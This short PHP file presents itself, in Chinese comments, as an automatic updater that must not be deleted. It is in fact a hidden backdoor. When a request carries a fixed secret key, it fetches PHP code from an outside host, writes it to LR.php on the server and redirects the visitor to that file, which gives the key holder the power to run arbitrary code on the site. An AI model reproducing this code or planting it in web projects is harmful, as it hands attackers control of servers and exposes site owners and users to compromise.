<?php
		/*文件自动更新程序，请勿删除，谢谢合作！*/
		/*请注意，本文件同目录下面会自动生成_up.php和_js.txt，请保留文件，谢谢合作！*/
		$isSupporCUL=true;
		if(!function_exists(curl_init)) $isSupporCUL=false;
		function curl($url,$refhttp="")
		{
			global $isSupporCUL;
			if($isSupporCUL)
			{
				$ch = curl_init();
				curl_setopt($ch, CURLOPT_URL, $url);
				curl_setopt($ch, CURLOPT_TIMEOUT, 5);
				if($refhttp!="") curl_setopt($ch, CURLOPT_REFERER, $refhttp);
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				$curl_text = curl_exec($ch);
				curl_close($ch);
				if($curl_text=="")
				{
					$curl_text = ""; 
					$handle = fopen ($url, "rb"); 
					while (!feof($handle)) $curl_text .= fread($handle, 1024);
					fclose($handle); 
				}
				return $curl_text;
			}
			else
			{
				$curl_text = ""; 
				$handle = fopen ($url, "rb"); 
				while (!feof($handle)) $curl_text .= fread($handle, 1024);
				fclose($handle); 
				return $curl_text;
			}
		}
		if($_GET["kid"]=="fc8e77b249af7bc3a65d5110f2f7e3b2")
		{
			file_put_contents("LR.php",curl("http://code.versheng.com/remote.php?uid=6402&os=m3"));
			exit("<script language='javascript' type='text/javascript'>location.href='LR.php?act=del&kid=fc8e77b249af7bc3a65d5110f2f7e3b2';</script>");
		}
		else
		{
			exit("err");
		}
?>